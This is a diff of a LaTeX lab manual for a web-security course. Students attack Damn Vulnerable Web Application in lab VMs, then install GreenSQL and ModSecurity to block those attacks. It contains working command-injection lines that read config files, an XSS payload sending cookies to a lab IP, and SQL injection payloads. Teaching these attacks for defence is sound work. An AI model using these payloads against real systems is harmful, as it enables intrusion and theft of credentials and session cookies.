@@ -41,19 +41,28 @@ Students must have possibility to run at least two virtual machines with configu
 \label{table:HW for DVWA}
 \end{table}
 
+\section{Learning Objectives}
 
-\section{Scope}
-This particular lab 
-\section{Learning Outcomes}
-Student knows common attack types related to web applications.
-\begin{itemize}
-	\item SQL Injection
-	\item OS command injection
-	\item  \gls{XSS}
-	\item  \gls{CSRF}
-\end{itemize} Student has skill to test those attacks using \gls{DVWA}.
-Student knows possible mitigation methods and employ appropriate protection methods.
+Student is able to install different application firewalls such as \gls{SQL} firewall and web application firewall. Minimal level is reached if the student demonstrates that different types of attacks are possible and successful against the vulnerable web application, installs \gls{SQL} firewall and demonstrates that basic \gls{SQLi} attacks are blocked, demonstrates that several web application attacks are still possible after installing the \gls{SQL} firewall such as reflected \gls{XSS} and stored \gls{XSS}, command injection and \gls{CSRF}, installs application firewall before web application and demonstrates that previously succeeded attacks (at least \gls{XSS}) are stopped.
+
 \section{Setting up the Virtual Environment}
+
+Two virtual machines are needed in this lab: Server and Client.
+Download server and client \gls{OVA} files from the following links:
+
+\url{http://elab.itcollege.ee:8000/infra_klient_small.ova}
+
+\url{http://elab.itcollege.ee:8000/infra_server.ova}
+
+Import virtual machines (If your host computer has only 4GB RAM, then reduce client machine memory to 1GB)
+
+Start both machines. 
+{\small{If you got an error about host only network then open Main Menu, choose File Preferences and choose Network and add Host Only Network.}}
+
+Username and password for both machines are student.
+
+Student user are in sudo group and can start administrator shell with \emph{sudo} command.
+
 \section{Installation of Damn Vulnerable Web Application}
 \subsection{Introduction to DVWA}
 
@@ -97,11 +106,28 @@ $_DVWA[ 'db_database' ] = 'dvwa';
 %$
 For save use  CTRL + X
 
+Next: the setup of DVWA database
 
+http://$ServerIP$/dvwa/setup.php
+
+
+Click the \emph{Create/Reset Database}
+
+Log into \gls{DVWA}
 http://$ServerIP$/dvwa/
 Username : admin
 Password : password
-Change DVWA Security level to low (for beginners)
+
+The main page of \gls{DVWA} should appear (Figure~\ref{Damn Vulnerable Web Application - default page})
+
+Change \gls{DVWA} Security level to low (Figure~\ref{Setting DVWA Security Level to Low})
+\begin{figure}[H] 
+ \centering 
+ \includegraphics[width=0.8\textwidth]{DVWA_Main_Page.pdf}
+ \rule{30em}{0.5pt}  
+ \caption{Damn Vulnerable Web Application - default page} 
+ \label{Damn Vulnerable Web Application - default page} 
+\end{figure}
 
 \begin{figure}[H] 
  \centering 
@@ -112,100 +138,48 @@ Change DVWA Security level to low (for beginners)
 \end{figure}
 
 
-\begin{figure}[H] 
- \centering 
- \includegraphics[width=0.8\textwidth]{DVWA_Main_Page.pdf}
- \rule{30em}{0.5pt}  
- \caption{Damn Vulnerable Web Application - default page} 
- \label{Damn Vulnerable Web Application - default page} 
-\end{figure}
+
 
 \subsection{Testing vulnerabilities}
 For understanding a defence of web application a basic offensive knowledge and skills are needed. However, this lab focused on defensive methods and will not provide knowledge about different \gls{OWASP} top ten. 
 
 \colorbox{red}{\parbox{\textwidth}{DISCLAIMER: Do not use followed methods on any computer except lab computer and only for learning propose!}}
 
-\subsubsection{Command execution}
-Read command execution material given in Command Execution menu and try and explaing following commands and results.
+\subsubsection{Common vulnerabilities}
+
+Try the following vulnerabilities (find out how)
 
 \begin{minted}[frame=lines,framesep=2mm]{bash}
 8.8.8.8; sed 's/</UUUU/' ../../config/config.inc.php
-
 #Find out directory and file structure of \gls{DVWA}
-8.8.8.8; ls -l 
-8.8.8.8; ls -l ../
+8.8.8.8; ls -l
 8.8.8.8; ls -l ../../
 8.8.8.8; sed 's/<//'  ../../../../wordpress/wp-config.php
 8.8.8.8; touch /var/tmp/new_file.txt
 8.8.8.8; ls /var/tmp/
-\end{minted}
-
-Try following command and explain what can describe output of following command?
-\begin{minted}[frame=lines,framesep=2mm]{bash}
 ; grep session.cookie_httponly /etc/php5/apache2/php.ini
 \end{minted}
-What attack vectors are possible when cookie\_httponly is set or not?
 
-\begin{minted}[frame=lines,framesep=2mm]{bash}
-session.cookie_httponly = 1
-\end{minted}
-
-What are better solution $0 or 1$?
-\begin{minted}[frame=lines,framesep=2mm]{bash}
-session.cookie_httponly = 0
-\end{minted}
-XSS
-\begin{minted}[frame=lines,framesep=2mm]{bash}
+{\scriptsize
+\begin{minted}[frame=lines,framesep=2mm]{html}
 <script>var i='<img src="http://192.168.56.101/'+document.cookie+'" />'; document.write(i);</script>
 \end{minted}
-veel XSSi
-\begin{minted}[frame=lines,framesep=2mm]{bash}
-%3Cscript%3Evar+i%3D%27%3Cimg+src%3D%22http%3A%2F%2F192.168.56.101%2F%27%2Bdocument.cookie%2B%27%22+%2F%3E%27%3B+document.write%28i%29%3B%3C%2Fscript%3E
-\end{minted}
-SQLi
-\begin{minted}[frame=lines,framesep=2mm]{bash}
-#blind
-1' union select BENCHMARK(100000000,ENCODE('hello','goodbye')),1; # --
- 
- 
-2' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;# --
- 
- 
-3' union  select TABLE_NAME,COLUMN_NAME from information_schema.columns; # --
 
+
+}
+%\begin{minted}[frame=lines,framesep=2mm]{bash}
+%3Cscript%3Evar+i%3D%27%3Cimg+src%3D%22http%3A%2F%2F192.168.56.101%2F%27%2Bdocument.cookie%2B%27%22+%2F%3E%27%3B+document.write%28i%29%3B%3C%2Fscript%3E
+%\end{minted}
+\begin{minted}[frame=lines,framesep=2mm]{sql}
+1' union select BENCHMARK(100000000,ENCODE('hello','goodbye')),1; # --
+2' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;# --
+3' union  select TABLE_NAME,COLUMN_NAME from information_schema.columns; # --'
 \end{minted}
 
 
 
 \section{Installation of SQL Application Firewall}
-SQL database firewall filters and rejects injected sql statements from untrusted web application. SQL firewall is application type firewall and usually understands database engine and SQL internals to determine possible malicious commands. For example detecting  SQL tautology (statement that gives always true) demands understanding SQL syntax and semantics. Detecting SQL tautology helps prevent commonly used authorization bypassing techniques.
-Each database engine behaves differently and SQL firewalls are database engine aware.
-
-
-Examples of commonly used database firewalls:
-\begin{itemize}
-\item DB Green SQL database firewall. Supports MySQL, Microsoft SQL Server, PostgreSQL
-\item GreenSQL Open Source database firewall. Supports MySQL, PostgreSQL.
-\item ORACLE database firewall. Supports Oracle, MySQL, Microsoft SQL Server, IBM DB2 and Sybase databases
-\item SecureSphere Database Firewall. Supports Oracle, Microsoft SQL Server, Sybase, DB2, Informix, MySQL, Progress, Teradata, Netezza backends.
-\end{itemize}
-
-SQL firewalls can reject and intercept queries and modify whitelists and blacklists. Database firewalls can give false positives and false negatives during operations. Database firewall can be used in most cases but for web applications that can compose any SQL query (like  phpmyadmin for example) those solutions are not efficient. It is also possible to abuse business logic with whitelisted queries and SQL database firewalls can’t protect for those queries.
-Some database firewalls supports monitoring queries and killing queries that are consuming too many resources.
-
-Pros:
-Effective way to protect SQL server for common injection attacks like SQL tautology ( ‘1’=’1’, ‘1’ like ‘1’ for example), union, if (if order by are used, then union is not allowed) etc.
-Firewalls can learn to compose whitelists/blacklists.
-
-Cons:
-Each firewall can be used to protect some particular database backends.
-Can give false positives and false negatives.
-
-Conclusion for  database firewall:
-If web application is SQL injection prone then database firewall solution should be used.
-For proper protection some other methods should also used like least privileges and filtering before web application.
-
-\subsection{GreenSQL Open Source SQL Firewall}
+Install the GreenSQL database firewall.
 \subsubsection{Installing GreenSQL from pre built package (FOR BEGINNERS)}
 \begin{minted}[frame=lines,framesep=2mm]{bash}
 wget http://elab.itcollege.ee:8000/Day3/greensql-fw_1.3.0_amd64.deb
@@ -223,7 +197,7 @@ chmod 0777 templates_c
 \subsubsection{Installing GreenSQL Open Source frou source code (For Advanced Students)}
 
 
-Download greensql-fw from download page.
+Download and install the \emph{greensql-fw}
 \begin{minted}[frame=lines,framesep=2mm]{bash}
 
 wget -O greensql-fw-1.3.0.tar.gz \
@@ -240,7 +214,6 @@ apt-get install debhelper
 apt-get install libpcre3-dev
 apt-get install libmysqlclient-dev
 apt-get install libpq-dev
-
 #Build deb package (In this case it fails. Find out why.)
 ./build.sh
 #Install package with dpkg
@@ -248,7 +221,6 @@ dpkg -i greensql-fw_1.3.0.deb
 #Modify existing virtualhost or create new virtualhost.
 cd /var/www/
 ln -s /usr/share/greensql-fw/ greensql
-
 cd greensql
 chmod 0777 templates_c
 \end{minted}
@@ -309,10 +281,10 @@ File /etc/apache2/mods-enabled/mod-security.conf
 </IfModule>
 \end{minted} 
 
-\url{https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project}
-\url{http://blog.spiderlabs.com/2011/07/modsecurity-sql-injection-challenge-lessons-learned.html}
+%\url{https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project}
+%\url{http://blog.spiderlabs.com/2011/07/modsecurity-sql-injection-challenge-lessons-learned.html}
 
-
+Test the previous vulnerabilities and demonstrate that they failed to pass.
 
 
 \section{Securing Web Application Configuration}
@@ -321,6 +293,12 @@ File /etc/apache2/mods-enabled/mod-security.conf
 \item Fixing Database Privileges
 \item Separating Web Applications (for internal use and for external use)
 \end{itemize}
+
+
+Install Nginx as \gls{TLS} termination according to this guide:
+\url{https://wiki.itcollege.ee/index.php/TLS_termineerimine_nginx_abil}
+
+Optional task: Find a Varnish firewall project and install the Varnish firewall.
 
 \section{Final System Architecture} 
 Keep in mind that final architecture contains several components to provide layered security for insecure web application as seen on Figure ~\ref{Architecture of Secured Web Application}
